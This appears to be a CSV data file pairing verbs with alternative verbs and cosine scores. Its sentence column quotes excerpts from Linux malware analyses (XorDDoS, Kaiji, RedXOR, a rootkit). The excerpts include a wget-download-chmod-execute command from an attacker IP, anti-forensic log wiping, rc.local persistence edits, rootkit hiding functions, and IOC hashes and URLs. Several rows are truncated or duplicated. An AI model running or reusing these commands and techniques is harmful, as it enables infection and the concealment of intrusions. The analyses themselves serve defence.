,verb_origin,verb_altern,cosine,sentence
8,contain,set,cos: 0.4812,"after running the elf file, uses an anti-forensic technique that hides its past activity by overwriting the content of the following sensitive files with a newline character:sensitive file	description/root/.bash_history	contains the commands that were run earlier/var/log/wtmp	contains login related record for users/var/log/btmp	contains record of failed login attempt/var/log/lastlog	contains the recent login information for users/var/log/secure	contains information related to security such as logs for authentication failure, sudo logins, and authorization privileges/var/log/boot.log	contains information related to system boot and message logged via system startup processes/var/log/cron	contains information related to cron job launch, success and failure error logs/var/log/dmesg	contains information related to kernel ring buffer messages, hardware devices, drivers, etc."
2,hardcode,connect,cos: 0.4605,table 2: data collected by the malware and sent back to the c2 serverurl key	description	commenthostip	ip	hardcoded to 127.0.0.1softtype		hardcoded to “linux”pscaddr	mac address	hostname	machine name	hosttar	username	possibly “host target”hostos	distribution	extracted from /etc/issue or /etc/redhat-releasehostcpu	clock speed	/proc/cpuinfohostmem	amount of memory	/proc/meminfohostpack		hardcoded to “linux”lkmtag	is rootkit enabled	kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.
3,resolv.conf,write,cos: 0.4395,encrypted strings	decoded valuem7a4nq_/na	/usr/bin/m [(n3	/bin/m6_6n3	/tmp/m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pidm.[$n__#4%\c\x1ab]0	/lib/libudev.som.[$n3	/lib/m4s4nac/na	/var/run/!#ff3ve.-7\x17v[_	cat resolv.conf<encrypted_remote_url>	hxxp://aa.hostasa[.
34,format,fork,cos: 0.4292,"a string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
26,find,download,cos: 0.4166,indicators of compromisekaijifile name	sha 256	trend micro pattern detection123.sh	9301d983e9d8fad3cc205ad67746cd111024daeb4f597a77934c7cfc1328c3d8	trojan.sh.kaiji.alinux_arm	d315b83e772dfddbd2783f016c38f021225745eb43c06bbdfd92364f68fa4c56	ddos.linux.kaiji.arelated urls:http://62.171.160.189/linux_armhttp://62.171.160.189/11/123.shxorddos and other malware variants found through the same urlsha 256	trend micro pattern detectiondba757c20fbc1d81566ef2877a9bfca9b3ddb84b9f04c0ca5ae668b7f40ea8c3	backdoor.linux.xorddos.ae6c8f95b82592ac08a03bfe32e4a4dbe637d1f542eb3ab3054042cec8ec301a3c	backdoor.linux.dofloo.ab286f774eb5b4f2f7c62d5e68f02a37b674cca7b8c861e189f1f596789322f9fe	backdoor.win32.sddos.arelated url:http://122.51.133.49:10086/vip
20,name,set,cos: 0.3891,"utilities, such as netstat, acquire tcp/udp connection information from files named /proc/net/tcp and /proc/net/udp."
27,wget,get,cos: 0.3874,"afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:wget http://122.51.133.49:10086/vip –o vipchmod 777 vip./vipthe xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server."
7,m6_6n3,set,cos: 0.3807,encrypted strings	decoded valuem7a4nq_/na	/usr/bin/m [(n3	/bin/m6_6n3	/tmp/m4s4nac/n&zv\x1aa/tb	/var/run/gcc.pidm.[$n__#4%\c\x1ab]0	/lib/libudev.som.[$n3	/lib/m4s4nac/na	/var/run/!#ff3ve.-7\x17v[_	cat resolv.conf<encrypted_remote_url>	hxxp://aa.hostasa[.
38,se,start,cos: 0.3779,installation  this backdoor adds the following processes:  sed -i -e '/exit/d' /etc/rc.local sed -i -e '/^\r\n
17,hook,access,cos: 0.3542,"the following table describes the symbols found in the rootkit and their corresponding functionalities:function name  	description  give_root  	provides a root privilege by setting a new set of credentials and assigning its uid, gid to “0”module_hide	hides the rootkit kernel modulemodule_show	unhides the rootkit kernel moduleget_udp_seq_show	hides the udp4 connection by hooking /proc/net/udphides the udp6 connection by hooking /proc/net/udp6get_tcp_seq_show	hides the tcp4 connection by hooking /proc/net/tcphides the tcp6 connection by hooking /proc/net/tcp6hide_udp4_port	adds a provided port to a list of hidden udp4 portsunhide_udp4_port	deletes a provided port from a list of hidden udp4 portshide_udp6_port	adds a provided port to a list of hidden udp6 portsunhide_udp6_port	deletes a provided port from a list of hidden udp6 portshide_tcp4_port	adds a provided port to a list of hidden tcp4 portsunhide_tcp4_port	deletes a provided port from a list of hidden tcp4 portshide_tcp6_port	adds a provided port to a list of hidden tcp6 portsunhide_tcp6_port	deletes a provided port from a list of hidden tcp6 portsunhide_allz	iterates list of all hidden ports and deletes all entriesfirewall_acceptip	adds an ip address provided to accept_ips listunfirewall_acceptip	deletes a provided entry from accept_ips listfirewall_dropip	adds a provided ip address to drop_ips listunfirewall_dropip	deletes a provided ip address to drop_ips listhide_proc	adds a provided entry to hidden_procs listunhide_proc	deletes a provided entry to hidden_procs list"
6,fetch,fetch,cos: 0.3169,"kill_processthe kill_process thread performs the following tasks:decodes encrypted stringsfetches file stats for /var/run/gcc.pid or, if none exist, then creates the filefetches file stats for /lib/libudev.so or, if none exist, then creates the directory /lib and creates a copy of itself at the location /lib/libudev.sofetches the on disk file information associated with the current process; if it fails, then exits the loop and stops the current processreads the content from kill_cfg and performs the corresponding actions, like stopping the process or deleting files, based on the matching specified keys in the configuration file, such as:md5=filename=rmfile=denyip=tcp_threadthe tcp_thread triggers the connection with the c2 server decoded earlier using decrypt_remotestr()."
25,read,access,cos: 0.3168,creates symbolic links which points to the script in /etc/init.d:/etc/rc{1-5}.d/s90{random numbers}/etc/rc.d/rc{1-5}.d/s90{random numbers}get the magic string value from the file /var/run/gcc.pidread the following from its configuration file:md5 - checksum of filedenyip - open communication with an ipfilename - list of filenamermfile - files to remove
36,se,set,cos: 0.2901,installation  this backdoor adds the following processes:  sed -i -e '/exit/d' /etc/rc.local sed -i -e '/^\r\n
37,start,set,cos: 0.2901,installation  this backdoor adds the following processes:  sed -i -e '/exit/d' /etc/rc.local sed -i -e '/^\r\n
